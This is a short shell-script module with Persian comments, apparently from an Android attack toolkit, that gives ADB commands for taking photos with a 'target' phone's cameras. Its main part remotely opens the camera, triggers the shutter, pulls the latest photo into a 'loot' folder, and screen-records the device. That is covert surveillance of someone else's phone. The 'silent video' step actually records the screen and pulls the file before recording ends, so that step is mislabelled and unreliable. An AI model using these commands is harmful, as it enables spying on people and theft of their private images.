DESC="عکس گرفتن از دوربین جلو/عقب گوشی هدف"
REQ="ADB وصل + اپ دوربین باز"
RISK="LOW"
NOTE="در اندروید ۱۱+ باید اپ دوربین یک‌بار روی گوشی باز شده باشد وگرنه خروجی سیاه می‌آید"

termux(){
cat <<'EOF'
# با Termux:API مستقیم روی گوشی خودت
termux-camera-info
termux-camera-photo -c 0 /sdcard/selfie.jpg     # دوربین جلو
termux-camera-photo -c 1 /sdcard/back.jpg       # دوربین عقب
EOF
}

kali(){
cat <<'EOF'
# روش ۱: گرفتن فریم از پیش‌نمایش دوربین هدف
adb shell am start -a android.media.action.STILL_IMAGE_CAMERA
sleep 3
adb shell input keyevent KEYCODE_CAMERA
sleep 2
adb shell ls -t /sdcard/DCIM/Camera/ | head -1

# روش ۲: کشیدن آخرین عکس
LATEST=$(adb shell ls -t /sdcard/DCIM/Camera/ | head -1 | tr -d '\r')
adb pull "/sdcard/DCIM/Camera/$LATEST" ./loot/

# روش ۳: ضبط ویدیو بدون صدا
adb shell screenrecord --time-limit 20 /sdcard/rec.mp4 &
adb pull /sdcard/rec.mp4 ./loot/
EOF
}
